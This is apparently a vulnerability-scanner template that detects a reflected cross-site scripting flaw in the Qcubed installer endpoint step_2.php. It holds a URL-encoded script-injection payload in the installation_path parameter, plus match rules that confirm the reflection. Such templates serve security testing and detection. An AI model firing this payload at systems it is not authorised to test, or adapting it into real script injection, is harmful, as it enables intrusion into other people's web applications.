id: qcubed-xss
brief:
    title: Qcubed - Cross-Site Scripting
    by: pikpikcu
    level: high
    about: Qcubed contains a cross-site scripting vulnerability which allows a remote attacker to inject arbitrary JavaScript via the /assets/php/_devtools/installer/step_2.php endpoint and the installation_p...
    label:
        - xss
        - qcubed
        - vuln
    score: CVSS:7.2
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/assets/php/_devtools/installer/step_2.php?installation_path=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
        - '{{BaseURL}}/qcubed/assets/php/_devtools/installer/step_2.php?installation_path=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
      signs:
        - "on": word
          has:
            - </script><script>alert(document.domain)</script>
          in: body
          need: all
        - "on": status
          status:
            - 200
        - "on": word
          has:
            - text/html
          in: header
          need: all
